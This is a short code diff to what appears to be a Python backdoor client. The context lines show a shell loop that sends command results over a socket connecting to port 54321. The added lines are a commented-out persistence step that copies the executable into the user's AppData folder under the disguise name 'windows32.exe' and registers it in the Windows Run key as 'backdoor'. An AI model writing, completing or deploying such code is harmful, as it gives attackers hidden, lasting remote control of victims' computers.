@@ -5,6 +5,7 @@ import subprocess
 import json
 import base64
 import os
+import shutil
 import sys
 import time
 
@@ -49,6 +50,11 @@ def shell():
             reliable_send(result)
 
 ip = "127.0.0.1"
+
+# location = os.environ["appdata"] = "\\windows32.exe"
+# if not os.path.exists(location):
+#     shutil.copyfile(sys.executable, location)
+#     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((ip,54321))
